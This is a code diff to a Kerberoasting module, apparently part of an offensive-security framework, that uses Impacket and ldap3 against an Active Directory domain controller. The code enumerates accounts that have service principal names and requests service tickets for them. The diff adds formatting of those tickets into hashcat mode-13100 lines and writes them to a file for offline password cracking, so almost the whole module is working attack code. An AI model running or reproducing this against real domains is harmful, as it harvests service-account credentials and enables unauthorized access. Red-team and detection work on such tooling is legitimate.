@@ -1,4 +1,4 @@
-"""Kerberoasting capability (Impacket-backed)."""
+"""Kerberoasting capability (Impacket-backed, hashcat format)."""
 
 from __future__ import annotations
 
@@ -10,6 +10,7 @@ from rich.console import Console
 from adaf_attack.core.graph import AttackGraph
 from adaf_attack.core.redaction import redact
 from adaf_attack.core.registry import register_capability
+from adaf_attack.core.roast_format import format_tgs_hashcat
 from adaf_attack.core.session import Session
 from adaf_attack.core.target import Target
 
@@ -34,11 +35,9 @@ class Kerberoast:
         **kwargs: Any,
     ) -> dict[str, Any]:
         try:
-            from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
             from impacket.krb5 import constants
+            from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
             from impacket.krb5.types import Principal
-            from impacket.ldap import ldap as impacket_ldap
-            from impacket.ldap import ldapasn1 as ldapasn1
         except ImportError as exc:
             raise RuntimeError(
                 "Kerberoasting requires Impacket. Install with: pip install 'adaf-attack[kerberos]'"
@@ -49,7 +48,6 @@ class Kerberoast:
 
         console.print(f"[bold]Kerberoast[/bold] → {target.domain} @ {target.dc_ip}")
 
-        # Discover SPN accounts via LDAP first (reuse simple ldap3 path or Impacket)
         from ldap3 import ALL, SUBTREE, Connection, Server
 
         server = Server(target.dc_ip, get_info=ALL, use_ssl=target.ldaps)
@@ -83,21 +81,20 @@ class Kerberoast:
                     graph.add_edge(user_id, user_id, "HasSPN", spn=spn)
 
         conn.unbind()
-
         console.print(f"Found [cyan]{len(targets)}[/cyan] SPN-enabled accounts")
 
-        # Request TGS tickets
-        hashes = target.hashes
         lmhash = nthash = ""
-        if hashes:
-            parts = hashes.split(":")
+        if target.hashes:
+            parts = target.hashes.split(":")
             if len(parts) == 2:
                 lmhash, nthash = parts
             else:
                 nthash = parts[0]
 
-        user_principal = Principal(target.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+        user_principal = Principal(
+            target.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
+        )
+        tgt, cipher, _old, session_key = getKerberosTGT(
             user_principal,
             target.password or "",
             target.domain.upper(),
@@ -108,29 +105,37 @@ class Kerberoast:
         )
 
         roasted = []
+        hash_lines: list[str] = []
+
         for t in targets:
             sam = t["sam"]
-            # Use first SPN
             spn = t["spns"][0]
             try:
-                spn_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
-                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+                spn_principal = Principal(
+                    spn, type=constants.PrincipalNameType.NT_SRV_INST.value
+                )
+                tgs, cipher, _old, session_key = getKerberosTGS(
                     spn_principal,
                     target.domain.upper(),
                     target.dc_ip,
                     tgt,
                     cipher,
-                    sessionKey,
+                    session_key,
                 )
-                # Build hashcat / john format (simplified)
-                # Full formatting would use Impacket's getUserSPNs output helpers
-                ticket_blob = tgs["ticket"].prettyPrint() if hasattr(tgs.get("ticket", b""), "prettyPrint") else str(tgs)
-                entry = {
+
+                hashcat_line = format_tgs_hashcat(tgs, sam, target.domain, spn)
+                entry: dict[str, Any] = {
                     "account": sam,
                     "spn": spn,
-                    "ticket": ticket_blob,
-                    "format": "impacket-raw",
+                    "format": "hashcat-13100" if hashcat_line else "impacket-raw",
                 }
+                if hashcat_line:
+                    entry["hash"] = hashcat_line
+                    hash_lines.append(hashcat_line)
+                else:
+                    entry["ticket"] = str(tgs)
+                    entry["note"] = "Could not build hashcat line; raw ticket kept"
+
                 roasted.append(entry)
                 console.print(f"  [green]✓[/green] {sam}  ({spn})")
             except Exception as exc:  # noqa: BLE001
@@ -146,10 +151,15 @@ class Kerberoast:
         redacted = redact(result, include_secrets=include_secrets)
         out_path = session.path("kerberoast.json")
         out_path.write_text(json.dumps(redacted, indent=2, default=str))
-        graph.save(session.path("graph.json"))
 
+        if include_secrets and hash_lines:
+            hashes_path = session.path("kerberoast.hashes.txt")
+            hashes_path.write_text("\n".join(hash_lines) + "\n")
+            console.print(f"Hashcat file → {hashes_path}")
+
+        graph.save(session.path("graph.json"))
         session.log("kerberoast.complete", count=len(roasted), include_secrets=include_secrets)
         console.print(f"Results → {out_path}")
         if not include_secrets:
-            console.print("[dim]Tickets redacted. Use --include-secrets to keep them.[/dim]")
+            console.print("[dim]Hashes redacted. Use --include-secrets to keep them.[/dim]")
         return redacted
